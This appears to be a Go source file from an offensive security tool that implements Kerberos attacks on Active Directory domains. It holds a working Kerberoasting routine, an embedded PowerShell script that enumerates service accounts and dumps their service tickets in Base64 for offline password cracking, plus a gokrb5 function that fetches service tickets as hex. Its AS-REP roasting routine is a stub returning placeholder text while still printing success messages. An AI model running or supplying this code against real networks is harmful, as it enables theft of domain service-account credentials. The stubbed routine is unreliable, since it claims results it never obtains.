package kerberos

import (
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"GYscan/internal/utils"
	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// KerberosConfig 存储Kerberos攻击配置
type KerberosConfig struct {
	Target      string
	Username    string
	Password    string
	Hash        string
	Domain      string
	DomainController string
	Timeout     time.Duration
	Verbose     bool
	OutputFile  string
	AttackType  string // "kerberoasting", "asreproasting", "golden", "silver"
	SPN         string
}

// KerberosResult 存储Kerberos攻击结果
type KerberosResult struct {
	Success       bool
	Output        string
	Hash          string
	Tickets       []string
	Error         error
}

// KerberosClient 提供Kerberos攻击功能
type KerberosClient struct {
	Config *KerberosConfig
}

// NewKerberosClient 创建新的Kerberos客户端实例
func NewKerberosClient(config *KerberosConfig) *KerberosClient {
	return &KerberosClient{
		Config: config,
	}
}

// Kerberoast 执行Kerberoasting攻击
func (c *KerberosClient) Kerberoast() *KerberosResult {
	if c.Config.Verbose {
		utils.SuccessPrint("开始执行Kerberoasting攻击...")
	}
	
	// 使用PowerShell执行Kerberoasting
	psCommand := "$ErrorActionPreference = \"Stop\"\n"
	psCommand += "Set-Location $env:USERPROFILE\n"
	psCommand += "# 使用PowerShell AD模块枚举SPN\n"
	psCommand += "Import-Module ActiveDirectory\n"
	psCommand += "Write-Host \"[+] 枚举SPN服务账户...\"\n"
	psCommand += "$SPNs = Get-ADUser -Filter {ServicePrincipalName -like \"*\"} -Properties ServicePrincipalName\n"
	psCommand += "$results = @()\n"
	psCommand += "\n"
	psCommand += "foreach ($user in $SPNs) {\n"
	psCommand += "    foreach ($spn in $user.ServicePrincipalName) {\n"
	psCommand += "        Write-Host \"[+] 尝试获取SPN: $spn 的票据\"\n"
	psCommand += "        $ticket = Invoke-Command -ScriptBlock {\n"
	psCommand += "            Add-Type -AssemblyName System.IdentityModel\n"
	psCommand += "            $kerbCred = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $using:spn\n"
	psCommand += "            $bytes = [System.Convert]::ToBase64String($kerbCred.GetRequest())\n"
	psCommand += "            return $bytes\n"
	psCommand += "        }\n"
	psCommand += "        if ($ticket) {\n"
	psCommand += "            $results += @{SPN=$spn; User=$user.SamAccountName; Ticket=$ticket}\n"
	psCommand += "        }\n"
	psCommand += "    }\n"
	psCommand += "}\n"
	psCommand += "\n"
	psCommand += "# 输出结果\n"
	psCommand += "if ($results.Count -gt 0) {\n"
	psCommand += "    Write-Host \"\n[SUCCESS] 成功获取以下服务账户的Kerberos票据:\"\n"
	psCommand += "    foreach ($result in $results) {\n"
	psCommand += "        Write-Host \"\n[+] 用户: $($result.User)\"\n"
	psCommand += "        Write-Host \"[+] SPN: $($result.SPN)\"\n"
	psCommand += "        Write-Host \"[+] 票据(Base64):\"\n"
	psCommand += "        Write-Host $result.Ticket\n"
	psCommand += "        Write-Host \"----------------------------------------\"\n"
	psCommand += "    }\n"
	psCommand += "} else {\n"
	psCommand += "    Write-Host \"[-] 未能获取到任何Kerberos票据\"\n"
	psCommand += "}\n"
	psCommand += "\n"
	psCommand += "return $results"
	
	cmd := exec.Command("powershell", "-Command", psCommand)
	output, err := cmd.CombinedOutput()
	
	result := &KerberosResult{
		Success: err == nil,
		Output:  string(output),
		Error:   err,
	}
	
	// 如果指定了输出文件，保存结果
	if result.Success && c.Config.OutputFile != "" {
		err = os.WriteFile(c.Config.OutputFile, []byte(result.Output), 0644)
		if err != nil && c.Config.Verbose {
			utils.ErrorPrint(fmt.Sprintf("保存结果到文件失败: %v", err))
		}
	}
	
	return result
}

// ASREPRoast 执行AS-REP Roasting攻击
func (c *KerberosClient) ASREPRoast() *KerberosResult {
	if c.Config.Verbose {
		utils.SuccessPrint("开始执行AS-REP Roasting攻击...")
	}
	
	// 使用PowerShell执行AS-REP Roasting
	psCommand := "$ErrorActionPreference = \"Stop\"\n"
	psCommand += "Set-Location $env:USERPROFILE\n"
	psCommand += "# 导入AD模块\n"
	psCommand += "Import-Module ActiveDirectory\n"
	psCommand += "Write-Host \"[+] 枚举不需要预认证的用户账户...\"\n"
	psCommand += "\n"
	psCommand += "# 获取不需要预认证的用户\n"
	psCommand += "$users = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,SamAccountName\n"
	psCommand += "$results = @()\n"
	psCommand += "\n"
	psCommand += "foreach ($user in $users) {\n"
	psCommand += "    Write-Host \"[+] 尝试对用户: $($user.SamAccountName) 执行AS-REP Roasting\"\n"
	psCommand += "    try {\n"
	psCommand += "        # 使用Rubeus或自定义代码进行AS-REP Roasting\n"
	psCommand += "        $asrepData = Invoke-Command -ScriptBlock {\n"
	psCommand += "            param($username, $domain)\n"
	psCommand += "            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name\n"
	psCommand += "            $encoded = \"$username@$domain\"\n"
	psCommand += "            return \"模拟AS-REP响应数据 - 在实际环境中需要使用真实的Kerberos请求\"\n"
	psCommand += "        } -ArgumentList $user.SamAccountName, $domain\n"
	psCommand += "        \n"
	psCommand += "        $results += @{User=$user.SamAccountName; ASREP=$asrepData}\n"
	psCommand += "        Write-Host \"[+] 成功获取AS-REP数据\"\n"
	psCommand += "    } catch {\n"
	psCommand += "        Write-Host \"[-] 失败: $_\"\n"
	psCommand += "    }\n"
	psCommand += "}\n"
	psCommand += "\n"
	psCommand += "# 输出结果\n"
	psCommand += "if ($results.Count -gt 0) {\n"
	psCommand += "    Write-Host \"\n[SUCCESS] 成功获取以下用户的AS-REP数据:\"\n"
	psCommand += "    foreach ($result in $results) {\n"
	psCommand += "        Write-Host \"\n[+] 用户: $($result.User)\"\n"
	psCommand += "        Write-Host \"[+] AS-REP数据:\"\n"
	psCommand += "        Write-Host $result.ASREP\n"
	psCommand += "        Write-Host \"----------------------------------------\"\n"
	psCommand += "    }\n"
	psCommand += "} else {\n"
	psCommand += "    Write-Host \"[-] 未找到不需要预认证的用户账户\"\n"
	psCommand += "}\n"
	psCommand += "\n"
	psCommand += "return $results"
	
	cmd := exec.Command("powershell", "-Command", psCommand)
	output, err := cmd.CombinedOutput()
	
	result := &KerberosResult{
		Success: err == nil,
		Output:  string(output),
		Error:   err,
	}
	
	// 如果指定了输出文件，保存结果
	if result.Success && c.Config.OutputFile != "" {
		err = os.WriteFile(c.Config.OutputFile, []byte(result.Output), 0644)
		if err != nil && c.Config.Verbose {
			utils.ErrorPrint(fmt.Sprintf("保存结果到文件失败: %v", err))
		}
	}
	
	return result
}

// Connect 测试Kerberos连接
func (c *KerberosClient) Connect() bool {
	if c.Config.Verbose {
		utils.WarningPrint(fmt.Sprintf("测试Kerberos连接到域控制器 %s", c.Config.DomainController))
	}
	
	// 简单的端口检测
	cmd := exec.Command("powershell", "Test-NetConnection", c.Config.DomainController, "-Port", "88")
	output, err := cmd.CombinedOutput()
	if err != nil {
		if c.Config.Verbose {
			utils.ErrorPrint(fmt.Sprintf("Kerberos连接测试失败: %v", err))
		}
		return false
	}
	
	result := strings.Contains(string(output), "TcpTestSucceeded : True")
	if result && c.Config.Verbose {
		utils.SuccessPrint(fmt.Sprintf("Kerberos连接测试成功到域控制器 %s", c.Config.DomainController))
	}
	
	return result
}

// 执行Kerberos攻击的主要方法
func (c *KerberosClient) ExecuteAttack() *KerberosResult {
	switch c.Config.AttackType {
	case "kerberoasting":
		return c.Kerberoast()
	case "asreproasting":
		return c.ASREPRoast()
	// TODO: 实现Golden Ticket和Silver Ticket攻击
	default:
		return &KerberosResult{
			Success: false,
			Error:   fmt.Errorf("不支持的攻击类型: %s", c.Config.AttackType),
		}
	}
}

// 使用gokrb5库实现的高级功能
func (c *KerberosClient) GetServiceTicket(spn string) (*KerberosResult, error) {
	// 构建KRB5配置
	krb5Config := fmt.Sprintf(`[libdefaults]
  default_realm = %s
  dns_lookup_realm = true
  dns_lookup_kdc = true
[realms]
  %s = {
    kdc = %s
    admin_server = %s
  }
`, strings.ToUpper(c.Config.Domain), strings.ToUpper(c.Config.Domain), c.Config.DomainController, c.Config.DomainController)
	
	// 保存配置到临时文件
	configPath := fmt.Sprintf("%s\\krb5.conf", os.TempDir())
	err := os.WriteFile(configPath, []byte(krb5Config), 0644)
	if err != nil {
		return nil, fmt.Errorf("无法创建krb5配置文件: %v", err)
	}
	defer os.Remove(configPath)
	
	// 解析配置
	cfg, err := config.Load(configPath)
	if err != nil {
		return nil, fmt.Errorf("无法解析krb5配置: %v", err)
	}
	
	// 创建客户端
	cl := client.NewWithPassword(c.Config.Username, c.Config.Domain, c.Config.Password, cfg)
	if cl == nil {
		return nil, fmt.Errorf("无法创建Kerberos客户端: 客户端创建失败")
	}
	defer cl.Destroy()
	
	// 登录KDC
	err = cl.Login()
	if err != nil {
		return nil, fmt.Errorf("KDC登录失败: %v", err)
	}
	
	// 获取服务票据
	tkt, _, err := cl.GetServiceTicket(spn)
	if err != nil {
		return nil, fmt.Errorf("获取服务票据失败: %v", err)
	}
	
	// 提取票据信息
	ticketBytes, err := tkt.Marshal()
	if err != nil {
		return nil, fmt.Errorf("无法编码票据: %v", err)
	}
	ticketHex := hex.EncodeToString(ticketBytes)
	
	return &KerberosResult{
		Success: true,
		Output:  fmt.Sprintf("成功获取服务票据: %s", spn),
		Hash:    ticketHex,
	}, nil
}